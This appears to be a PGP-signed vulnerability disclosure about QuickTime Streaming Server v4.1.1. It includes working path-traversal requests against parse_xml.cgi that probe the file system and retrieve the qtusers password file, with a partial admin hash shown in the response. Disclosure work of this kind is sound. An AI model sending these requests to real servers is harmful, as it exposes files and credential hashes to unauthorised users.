-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Word.
I've found two other issues in QuickTime Streaming Server v4.1.1 that
seem to be fixed in the newest v4.1.3:
1.) File probing:
Request: http://localhost:1220/parse\_xml.cgi?filename=../nonexistent
Response: 'Can't access HTML file '../nonexistent'!' [...]
Request: http://localhost:1220/parse\_xml.cgi?
filename=../../../autoexec.bat
Response: 'Can't open HTML file '../../../autoexec.bat'! [...]
As you can see, this discrepency in the error message allows an
unauthenticated user to "feel-out" the file system and determine what
structures and files exist.
2.) File retrieval:
Request: http://localhost:1220/parse\_xml.cgi?filename=.../qtusers
Response: "realm Streaming Server admin:$dufr$D9/.....$C4g2VaRK" [...]
This works against the Win32 platform, and not against the Linux
platform; this was not tested against Solaris or MacOS X.
